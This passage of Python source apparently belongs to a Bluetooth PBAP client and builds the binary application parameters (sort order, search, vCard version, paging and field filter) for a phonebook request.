          bit 12: TITLE        bit 13: ROLE       bit 14: LOGO
          bit 15: AGENT        bit 16: ORG        bit 17: NOTE
          bit 18: REV          bit 19: SOUND      bit 20: URL
          bit 21: UID          bit 22: KEY        bit 23: NICKNAME
          bit 24: CATEGORIES   bit 25: PROID      bit 26: CLASS
          bit 27: SORT-STRING  bit 28: X-IRMC-CALL-DATETIME
        """
        params = b""

        order_id = PBAP_LIST_ORDER.get((order or "").lower())
        if order_id is not None:
            params += struct.pack(">BBB", 0x01, 0x01, order_id)

        attr_id = PBAP_SEARCH_ATTRIBUTE.get((search_attr or "").lower())
        if attr_id is not None:
            params += struct.pack(">BBB", 0x02, 0x01, attr_id)

        if search_value:
            search_bytes = search_value.encode("utf-8", errors="replace") + b"\x00"
            params += struct.pack(">BB", 0x03, len(search_bytes)) + search_bytes

        # Format: 0=vCard 2.1, 1=vCard 3.0
        params += struct.pack(">BBB", 0x07, 0x01, vcard_version)

        if max_count > 0:
            params += struct.pack(">BBH", 0x04, 0x02, max_count)

        if offset > 0:
            params += struct.pack(">BBH", 0x05, 0x02, offset)

        # Filter: specific bits or all fields
        if filter_bits is not None:
            params += struct.pack(">BB", 0x06, 0x08) + struct.pack(">Q", filter_bits)
        else:
            # All fields
            params += struct.pack(">BB", 0x06, 0x08) + b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"

        return params
